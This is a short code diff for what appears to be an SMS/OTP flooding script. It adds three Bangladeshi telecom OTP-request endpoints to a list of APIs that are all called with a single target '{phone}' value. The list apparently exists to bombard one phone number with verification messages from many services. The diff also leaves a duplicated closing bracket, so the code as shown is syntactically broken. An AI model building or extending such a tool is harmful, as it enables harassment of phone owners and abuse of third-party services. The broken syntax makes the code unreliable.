@@ -104,6 +104,10 @@ CALL_APIS = [
     # বাড়তি ২টি কল OTP (চাইলে যোগ করতে পারেন)
     {"name": "Pathao OTP", "method": "POST", "url": "https://api.pathao.com/api/v1/otp/request", "body": {"phone": "{phone}"}},
     {"name": "FoodPanda OTP", "method": "POST", "url": "https://foodpanda.com.bd/api/v1/otp/send", "body": {"phone": "{phone}"}},
+    {"name": "Robi OTP", "method": "POST", "url": "https://webapi.robi.com.bd/v1/send-otp", "body": {"phone": "{phone}"}},
+    {"name": "Banglalink OTP", "method": "POST", "url": "https://eshop-api.banglalink.net/api/v1/customer/send-otp", "body": {"phone": "{phone}"}},
+    {"name": "Teletalk OTP", "method": "POST", "url": "https://selfcare.teletalk.com.bd/api/otp/send", "body": {"phone": "{phone}"}},
+]
 ]
 
 # ========== LOGGING ==========
